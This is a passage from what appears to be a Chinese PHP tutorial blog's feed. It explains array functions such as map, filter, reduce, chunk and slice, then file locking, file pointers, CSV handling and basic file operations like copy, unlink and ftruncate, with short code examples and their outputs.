align="center">作用</th><th align="center">示例</th></tr></thead><tbody><tr><td align="center"><code>array_diff_assoc()</code></td><td align="center">返回差集（键值比较）</td><td align="center"><code>array_diff_assoc([&quot;a&quot;=&gt;1,&quot;b&quot;=&gt;2], [&quot;a&quot;=&gt;1]); // [&quot;b&quot;=&gt;2]</code></td></tr><tr><td align="center"><code>array_intersect_assoc()</code></td><td align="center">返回交集（键值比较）</td><td align="center"><code>array_intersect_assoc([&quot;a&quot;=&gt;1,&quot;b&quot;=&gt;2], [&quot;a&quot;=&gt;1]); // [&quot;a&quot;=&gt;1]</code></td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 键值比较</span></span><br><span class="line"><span class="variable">$set3</span> = [<span class="string">&quot;red&quot;</span> =&gt; <span class="string">&quot;#f00&quot;</span>, <span class="string">&quot;green&quot;</span> =&gt; <span class="string">&quot;#0f0&quot;</span>, <span class="string">&quot;blue&quot;</span> =&gt; <span class="string">&quot;#00f&quot;</span>];</span><br><span class="line"><span class="variable">$set4</span> = [<span class="string">&quot;red&quot;</span> =&gt; <span class="string">&quot;#f00&quot;</span>, <span class="string">&quot;yellow&quot;</span> =&gt; <span class="string">&quot;#ff0&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$diffAssoc</span> = <span class="title function_ invoke__">array_diff_assoc</span>(<span class="variable">$set3</span>, <span class="variable">$set4</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;差集(键值): &quot;</span>; <span class="title function_ invoke__">print_r</span>(<span class="variable">$diffAssoc</span>); <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输出：</span></span><br><span class="line"><span class="comment">差集(键值): Array</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">    [green] =&gt; #0f0</span></span><br><span class="line"><span class="comment">    [blue] =&gt; #00f</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="variable">$intersectAssoc</span> = <span class="title function_ invoke__">array_intersect_assoc</span>(<span class="variable">$set3</span>, <span class="variable">$set4</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;交集(键值): &quot;</span>; <span class="title function_ invoke__">print_r</span>(<span class="variable">$intersectAssoc</span>); <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输出：</span></span><br><span class="line"><span class="comment">交集(键值): Array</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">    [red] =&gt; #f00</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="5-实用函数"><a href="#5-实用函数" class="headerlink" title="5. 实用函数"></a>5. 实用函数</h2><h3 id="5-1-映射函数"><a href="#5-1-映射函数" class="headerlink" title="5.1 映射函数"></a>5.1 映射函数</h3><p>​映射函数——<code>array_map()</code>，它的作用是：应用回调函数到每个元素。例如：<code>array_map(&quot;strtoupper&quot;, [&quot;a&quot;,&quot;b&quot;]); // [&quot;A&quot;,&quot;B&quot;]</code>。这个函数中我们可以通过参数一的匿名函数来对数组的每一个元素进行操作，就像例子中我们对每一个元素都进行了平方。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 映射函数</span></span><br><span class="line"><span class="variable">$numbers</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$squared</span> = <span class="title function_ invoke__">array_map</span>(function(<span class="variable">$n</span>) &#123; <span class="keyword">return</span> <span class="variable">$n</span> * <span class="variable">$n</span>; &#125;, <span class="variable">$numbers</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;平方映射: &quot;</span>; <span class="title function_ invoke__">print_r</span>(<span class="variable">$squared</span>); <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输出：</span></span><br><span class="line"><span class="comment">平方映射: Array</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">    [0] =&gt; 1</span></span><br><span class="line"><span class="comment">    [1] =&gt; 4</span></span><br><span class="line"><span class="comment">    [2] =&gt; 9</span></span><br><span class="line"><span class="comment">    [3] =&gt; 16</span></span><br><span class="line"><span class="comment">    [4] =&gt; 25</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="5-2-过滤函数"><a href="#5-2-过滤函数" class="headerlink" title="5.2 过滤函数"></a>5.2 过滤函数</h3><p>​过滤函数——<code>array_filter()</code>，它的作用是：用回调过滤数组。例如：<code>array_filter([1,2,3], fn($v) =&gt; $v&gt;1); // [2,3]</code>。顾名思义这个函数是通过参数二的匿名函数自定义的过滤出数组中符合条件的元素，可以看到例子中我们过滤出了可以被2整除的元素。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 过滤函数</span></span><br><span class="line"><span class="variable">$numbers</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$even</span> = <span class="title function_ invoke__">array_filter</span>(<span class="variable">$numbers</span>, function(<span class="variable">$n</span>) &#123; <span class="keyword">return</span> <span class="variable">$n</span> % <span class="number">2</span> == <span class="number">0</span>; &#125;);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;偶数过滤: &quot;</span>; <span class="title function_ invoke__">print_r</span>(<span class="variable">$even</span>); <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输出：</span></span><br><span class="line"><span class="comment">偶数过滤: Array</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">    [1] =&gt; 2</span></span><br><span class="line"><span class="comment">    [3] =&gt; 4</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="5-3-归约函数"><a href="#5-3-归约函数" class="headerlink" title="5.3 归约函数"></a>5.3 归约函数</h3><p>​归约函数——<code>array_reduce()</code>，它的作用是：迭代缩减为单一值。例如：<code>array_reduce([1,2,3], fn($c,$v) =&gt; $c+$v, 0); // 6</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 归约函数</span></span><br><span class="line"><span class="variable">$numbers</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$sum</span> = <span class="title function_ invoke__">array_reduce</span>(<span class="variable">$numbers</span>, function(<span class="variable">$carry</span>, <span class="variable">$n</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$carry</span> + <span class="variable">$n</span>;</span><br><span class="line">&#125;, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;数组求和: <span class="subst">$sum</span>&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// 输出：数组求和: 15</span></span><br></pre></td></tr></table></figure><h3 id="5-4-数组遍历"><a href="#5-4-数组遍历" class="headerlink" title="5.4 数组遍历"></a>5.4 数组遍历</h3><p>​数组遍历——<code>array_walk()</code>，它的作用是：自定义处理每个元素。例如：<code>array_walk($arr, fn($v) =&gt; echo $v);</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 数组遍历</span></span><br><span class="line"><span class="variable">$numbers</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;数组遍历: &quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">array_walk</span>(<span class="variable">$numbers</span>, function(<span class="variable">$value</span>, <span class="variable">$key</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;[<span class="subst">$key</span>=&gt;<span class="subst">$value</span>] &quot;</span>;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 输出：数组遍历: [0=&gt;1] [1=&gt;2] [2=&gt;3] [3=&gt;4] [4=&gt;5]</span></span><br></pre></td></tr></table></figure><h3 id="5-5-数组分块"><a href="#5-5-数组分块" class="headerlink" title="5.5 数组分块"></a>5.5 数组分块</h3><p>​数组分块——<code>array_chunk()</code>，它的作用是：分割数组为多块。例如：<code>array_chunk([&quot;a&quot;,&quot;b&quot;,&quot;c&quot;], 2); // [[&quot;a&quot;,&quot;b&quot;], [&quot;c&quot;]]</code>。其中参数二指明了这个要分块数组每一部分含有多少个元素。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 数组分块</span></span><br><span class="line"><span class="variable">$chunks</span> = <span class="title function_ invoke__">array_chunk</span>([<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;d&quot;</span>, <span class="string">&quot;e&quot;</span>], <span class="number">2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;数组分块: &quot;</span>; <span class="title function_ invoke__">print_r</span>(<span class="variable">$chunks</span>); <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输出：</span></span><br><span class="line"><span class="comment">数组分块: Array</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">    [0] =&gt; Array</span></span><br><span class="line"><span class="comment">        (</span></span><br><span class="line"><span class="comment">            [0] =&gt; a</span></span><br><span class="line"><span class="comment">            [1] =&gt; b</span></span><br><span class="line"><span class="comment">        )</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    [1] =&gt; Array</span></span><br><span class="line"><span class="comment">        (</span></span><br><span class="line"><span class="comment">            [0] =&gt; c</span></span><br><span class="line"><span class="comment">            [1] =&gt; d</span></span><br><span class="line"><span class="comment">        )</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    [2] =&gt; Array</span></span><br><span class="line"><span class="comment">        (</span></span><br><span class="line"><span class="comment">            [0] =&gt; e</span></span><br><span class="line"><span class="comment">        )</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="5-6-数组切片"><a href="#5-6-数组切片" class="headerlink" title="5.6 数组切片"></a>5.6 数组切片</h3><p>​数组切片——<code>array_slice()</code>，它的作用是：截取数组片段。例如：<code>array_slice([&quot;a&quot;,&quot;b&quot;,&quot;c&quot;], 1, 2); // [&quot;b&quot;,&quot;c&quot;]</code>。其中参数二和参数三指明了切片的其实和终止位置。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 数组切片</span></span><br><span class="line"><span class="variable">$slice</span> = <span class="title function_ invoke__">array_slice</span>([<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;d&quot;</span>, <span class="string">&quot;e&quot;</span>], <span class="number">1</span>, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;数组切片: &quot;</span>; <span class="title function_ invoke__">print_r</span>(<span class="variable">$slice</span>); <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输出：</span></span><br><span class="line"><span class="comment">数组切片: Array</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">    [0] =&gt; b</span></span><br><span class="line"><span class="comment">    [1] =&gt; c</span></span><br><span class="line"><span class="comment">    [2] =&gt; d</span></span><br><span class="line"><span class="comment">)s</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="5-7-栈模拟"><a href="#5-7-栈模拟" class="headerlink" title="5.7 栈模拟"></a>5.7 栈模拟</h3><p>​栈模拟使用数组实现栈操作。例如：<code>$stack = [];array_push($stack, 3);$top = array_pop($stack);</code>。（先入后出）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 栈模拟</span></span><br><span class="line"><span class="variable">$stack</span> = [];</span><br><span class="line"><span class="title function_ invoke__">array_push</span>(<span class="variable">$stack</span>, <span class="string">&quot;first&quot;</span>, <span class="string">&quot;second&quot;</span>);</span><br><span class="line"><span class="variable">$top</span> = <span class="title function_ invoke__">array_pop</span>(<span class="variable">$stack</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;栈顶元素: <span class="subst">$top</span>&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// 输出：栈顶元素：second</span></span><br></pre></td></tr></table></figure><h2 id="6-数组统计"><a href="#6-数组统计" class="headerlink" title="6. 数组统计"></a>6. 数组统计</h2><table><thead><tr><th align="center">函数</th><th align="center">作用</th><th align="center">示例</th></tr></thead><tbody><tr><td align="center"><code>array_sum()</code></td><td align="center">计算值总和</td><td align="center"><code>array_sum([1,2,3]); // 6</code></td></tr><tr><td align="center"><code>array_product()</code></td><td align="center">计算值乘积</td><td align="center"><code>array_product([2,3,4]); // 24</code></td></tr><tr><td align="center"><code>count()</code></td><td align="center">统计元素数量</td><td align="center"><code>count([&quot;a&quot;,&quot;b&quot;]); // 2</code></td></tr><tr><td align="center"><code>array_count_values()</code></td><td align="center">统计值出现次数</td><td align="center"><code>array_count_values([&quot;a&quot;,&quot;b&quot;,&quot;a&quot;]); // [&quot;a&quot;=&gt;2, &quot;b&quot;=&gt;1]</code></td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 数组统计</span></span><br><span class="line"><span class="variable">$data</span> = [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">10</span>, <span class="number">20</span>, <span class="number">10</span>];</span><br><span class="line"><span class="variable">$count</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$sum</span> = <span class="title function_ invoke__">array_sum</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$product</span> = <span class="title function_ invoke__">array_product</span>([<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]);</span><br><span class="line"><span class="variable">$frequencies</span> = <span class="title function_ invoke__">array_count_values</span>(<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;数组统计: </span></span><br><span class="line"><span class="string">元素数量: <span class="subst">$count</span></span></span><br><span class="line"><span class="string">元素总和: <span class="subst">$sum</span></span></span><br><span class="line"><span class="string">元素乘积(2×3×4): <span class="subst">$product</span></span></span><br><span class="line"><span class="string">值频率: &quot;</span>; <span class="title function_ invoke__">print_r</span>(<span class="variable">$frequencies</span>); <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输出：</span></span><br><span class="line"><span class="comment">数组统计: </span></span><br><span class="line"><span class="comment">元素数量: 6</span></span><br><span class="line"><span class="comment">元素总和: 100</span></span><br><span class="line"><span class="comment">元素乘积(2×3×4): 24</span></span><br><span class="line"><span class="comment">值频率: Array</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">    [10] =&gt; 3</span></span><br><span class="line"><span class="comment">    [20] =&gt; 2</span></span><br><span class="line"><span class="comment">    [30] =&gt; 1</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP基础入门（四）</title>
      <link href="/2025/07/21/PHP%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
      <url>/2025/07/21/PHP%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%EF%BC%88%E5%9B%9B%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP基础入门（四）"><a href="#PHP基础入门（四）" class="headerlink" title="PHP基础入门（四）"></a>PHP基础入门（四）</h1><blockquote><p>[!NOTE]</p><p>本篇文章仅用于个人交流与学习，如涉及侵权请联系站长删除！</p></blockquote><p>​本篇文章来介绍PHP文件系统操作函数的核心用法的第二部分！</p><h2 id="1-文件锁与指针"><a href="#1-文件锁与指针" class="headerlink" title="1. 文件锁与指针"></a>1. 文件锁与指针</h2><ol><li><p><code>flock($handle, $operation)</code></p><ul><li><p>文件锁是一种文件读写机制，在任何特定的时间只允许一个进程访问一个文件。利用这种机制能够使读写单个文件的过程变得更安全。这里我们使用<code>flock()</code>函数。<code>flock()</code>会依参数<code>$operation</code>所指定的方式对参数<code>$handle</code>所指的文件做各种锁定或解除锁定的动作。此函数只能锁定整个文件，无法锁定文件的某一区域。</p><ul><li><p><code>LOCK_SH</code>建立共享锁定。多个进程可同时对同一个文件作共享锁定。</p></li><li><p><code>LOCK_EX</code>建立互斥锁定。一个文件同时只有一个互斥锁定。</p></li><li><p><code>LOCK_UN</code>解除文件锁定状态。</p></li><li><p><code>LOCK_NB</code>法建立锁定时，此操作可不被阻断，马上返回进程。</p></li></ul></li><li><p>简单地说文件锁就是一个防止多人同时操作文件数据，而导致发生冲突的机制，谁先拿到锁谁就可以安心操作文件，后面的人要么排队等待前面的文件操作完成，要么收到正在使用的通知。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">flock</span>(<span class="variable">$file</span>, LOCK_EX)) &#123;</span><br><span class="line">  <span class="title function_ invoke__">fwrite</span>(<span class="variable">$file</span>, <span class="string">&quot;Data&quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">flock</span>(<span class="variable">$file</span>, LOCK_UN);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>解释：</strong>上面的程序就是一个很好的例子，先通过<code>if (flock($file, LOCK_EX))</code>来获得写锁，使得其他人无法对这个文件进行操作，再通过<code>if</code>语句来判断文件是否已经锁定成功，这里需要注意<code>flock()</code>函数返回的是一个布尔值，如果返回<code>TRUE</code>则说明文件锁操作成功，反之则说明操作失败；之后就是对文件进行操作，最后再通过<code>flock($file, LOCK_UN);</code>来释放文件，这样下一个人才能对此文件进行操作。</p></li></ul></li><li><p><code>fseek($handle, $offset, $whence)</code> 和 <code>ftell($handle)</code></p><ul><li><p><code>fseek()</code>函数的作用是将指针移动到指定位置，其中<code>$handle</code>文件资源由<code>fopen()</code>函数打开，<code>offset</code>参数为偏移量（字节），<code>$whence</code>参数是基准位置，是一个可选项，如果不设置的话则默认从文件开头开始。</p><ul><li><code>SEEK_SET</code>（默认）：从文件开头计算（<code>$offset</code> &gt;&#x3D; 0）</li><li><code>SEEK_CUR</code>：从当前位置计算（<code>$offset</code> 可正可负）</li><li><code>SEEK_END</code>：从文件末尾计算（<code>$offset</code> 通常为负）</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="comment">// 跳转到第 10 字节（从开头）</span></span><br><span class="line"><span class="title function_ invoke__">fseek</span>(<span class="variable">$file</span>, <span class="number">10</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 向前移动 5 字节（从当前位置）</span></span><br><span class="line"><span class="title function_ invoke__">fseek</span>(<span class="variable">$file</span>, <span class="number">5</span>, SEEK_CUR); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 跳转到倒数第 8 字节（从末尾）</span></span><br><span class="line"><span class="title function_ invoke__">fseek</span>(<span class="variable">$file</span>, -<span class="number">8</span>, SEEK_END);</span><br></pre></td></tr></table></figure></li><li><p><code>ftell()</code>函数的作用是获取当前文件的指针位置（距离文件开头的字节偏移量）。他的参数<code>$handle</code>也指文件资源。返回值是一个整数，来表示当前文件指针位置。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fseek</span>(<span class="variable">$file</span>, <span class="number">100</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">ftell</span>(<span class="variable">$file</span>); <span class="comment">// 输出 100</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><code>rewind($handle)</code></p><ul><li><code>rewind()</code>函数的作用是重置指针到开头。</li></ul></li></ol><h2 id="2-CSV处理"><a href="#2-CSV处理" class="headerlink" title="2. CSV处理"></a>2. CSV处理</h2><p>​CSV文件是一种用于存储表格和电子表格信息的纯文本文件，PHP的CSV处理其实就是一种可以让用户轻松进行：<strong>「读表格数据」、「存表格数据」、「转表格数据」</strong>的实用工具。</p><ol><li><code>fputcsv($handle, $arry)</code><ul><li><code>fputcsv()</code>函数是用来写入CSV行。</li></ul></li><li><code>fgetcsv($handle)</code><ul><li><code>fgetcsv()</code>函数是用来读取CSV行。</li></ul></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;G:/phpCode/test.txt&quot;</span>, <span class="string">&#x27;w+&#x27;</span>); <span class="comment">// 以读写的方式打开文件</span></span><br><span class="line"><span class="variable">$arry</span> = [<span class="string">&quot;Peter&quot;</span>, <span class="string">&quot;Oslo&quot;</span>, <span class="string">&quot;Norway&quot;</span>]; <span class="comment">// 定义需要存储的数组</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fputcsv</span>(<span class="variable">$file</span>, <span class="variable">$arry</span>); <span class="comment">// 使用csv处理将数组以文本方式写入文件</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">rewind</span>(<span class="variable">$file</span>); <span class="comment">// ！重要！重置指针到文件头</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">fgetcsv</span>(<span class="variable">$file</span>)); <span class="comment">// 打印数组 输出Array ( [0] =&gt; Peter [1] =&gt; Oslo [2] =&gt; Norway )</span></span><br></pre></td></tr></table></figure><ul><li><strong>补充：</strong>在代码中我们使用<code>rewind()</code>函数来重置指针位置的原因是：当我们在执行<code>fputcsv()</code>函数是指针默认从文件头开始，在写入所有数据后，指针会停留在文件末尾。如果不进行指针重置的话<code>fgetcsv()</code>函数就会从当前位置开始读取数据，但是当前指针后面是没有数据的，这回导致<code>print_r()</code>函数不会打印任何东西。</li></ul><h2 id="3-文件操作"><a href="#3-文件操作" class="headerlink" title="3. 文件操作"></a>3. 文件操作</h2><ol><li><p><code>copy($source, $dest)</code></p><ul><li><p>该函数的作用是复制文件，他的两个参数必须是路径。</p></li><li><p><code>$source</code>参数表示原文件的路径，而<code>$dest</code>参数表示目标路径。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用绝对路径（推荐）</span></span><br><span class="line"><span class="title function_ invoke__">copy</span>(<span class="string">&#x27;/home/user/data.txt&#x27;</span>, <span class="string">&#x27;/home/user/backup/data.txt&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用相对路径（相对于当前脚本目录）</span></span><br><span class="line"><span class="title function_ invoke__">copy</span>(<span class="string">&#x27;source/images/photo.jpg&#x27;</span>, <span class="string">&#x27;backup/photo.jpg&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 跨目录操作</span></span><br><span class="line"><span class="title function_ invoke__">copy</span>(<span class="string">&#x27;../../shared/file.txt&#x27;</span>, <span class="string">&#x27;../target/file.txt&#x27;</span>);</span><br></pre></td></tr></table></figure></li></ul></li><li><p><code>unlink($file)</code></p><ul><li>该函数用来删除文件。</li><li><code>$file</code>参数表示删除文件的路径</li></ul></li><li><p><code>rename($old, $new)</code></p><ul><li>重命名文件&#x2F;目录：<code>rename(&quot;images&quot;, &quot;pictures&quot;)</code></li></ul></li><li><p><code>ftruncate($handle, $size)</code></p><ul><li><p>截断文件：<code>ftruncate($file, 100)</code>（保留100字节）</p></li><li><p>需要注意的是，<code>ftruncate()</code>函数在使用前需要通过<code>fopen()</code>函数来创建一个文件句柄。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$handle</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;data.txt&quot;</span>, <span class="string">&quot;r+&quot;</span>); <span class="comment">// 以读写模式创造一个文件句柄</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ftruncate</span>(<span class="variable">$handle</span>, <span class="number">100</span>); <span class="comment">// 将文件缩减至 100 字节</span></span><br><span class="line"></span><br><span class="line"><span 